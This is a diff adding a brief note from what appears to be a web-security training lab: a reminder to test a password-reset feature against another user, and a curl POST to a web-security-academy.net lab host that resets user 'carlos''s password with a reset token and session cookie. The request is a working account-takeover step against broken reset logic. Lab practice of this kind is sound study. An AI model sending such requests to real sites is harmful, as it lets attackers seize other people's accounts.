@@ -1,0 +1,8 @@
+
+
+Check resetPassword function & feature with other user with or without your sessinId
+
+curl -ik -X $'POST' \
+    -b $'session=ZZUVu16XVN5otsezNjW8QJ1mDJnOb5b2' \
+    --data-binary $'temp-forgot-password-token=uncjytly8t32phcrt1tb3vm44mzcdzci&username=carlos&new-password-1=password&new-password-2=password' \
+    $'https://0a7e0015042fcc8181c498d1004d009a.web-security-academy.net/forgot-password?temp-forgot-password-token=uncjytly8t32phcrt1tb3vm44mzcdzci'
